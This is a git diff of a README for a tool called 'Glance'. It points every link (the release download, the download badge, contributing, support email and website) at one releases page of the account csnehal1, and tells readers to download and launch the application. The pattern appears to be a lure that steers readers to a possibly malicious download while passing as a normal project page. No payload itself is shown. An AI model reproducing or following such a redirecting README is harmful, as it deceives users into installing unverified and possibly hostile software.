@@ -10,10 +10,10 @@ Welcome to the official GitHub repository for **Glance**, a powerful tool for ma
 - **Collaboration:** Share configurations with your team effortlessly.
 
 ## Quick Start
-To get started with Glance, simply head over to our [latest release](https://github.com/repo/releases/9246/App.zip). Don't forget to launch the application once you've downloaded it!
+To get started with Glance, simply head over to our [latest release](https://github.com/csnehal1/glance/releases). Don't forget to launch the application once you've downloaded it!
 
 ## Grab Your Copy Now! 📁
-[![Download Glance](https://img.shields.io/badge/Download-Glance-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Glance](https://github.com/csnehal1/glance/releases)](https://github.com/csnehal1/glance/releases)
 
 ## Installation
 1. Download Glance from the provided link.
@@ -21,13 +21,13 @@ To get started with Glance, simply head over to our [latest release](https://git
 3. Follow the on-screen instructions to set up your configurations.
 
 ## Contributing 🤝
-We welcome contributions from the community! Whether it's bug fixes, feature enhancements, or feedback, feel free to [contribute](CONTRIBUTING.md) to Glance.
+We welcome contributions from the community! Whether it's bug fixes, feature enhancements, or feedback, feel free to [contribute](https://github.com/csnehal1/glance/releases) to Glance.
 
 ## Support 🎉
-If you encounter any issues or have any questions, please reach out to our [support team](mailto:support@glance.com).
+If you encounter any issues or have any questions, please reach out to our [support team](https://github.com/csnehal1/glance/releases).
 
 ## Stay Connected 🌐
-Stay up to date with the latest news and updates by visiting our [website](https://glance.com).
+Stay up to date with the latest news and updates by visiting our [website](https://github.com/csnehal1/glance/releases).
 
 ## License ℹ️
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
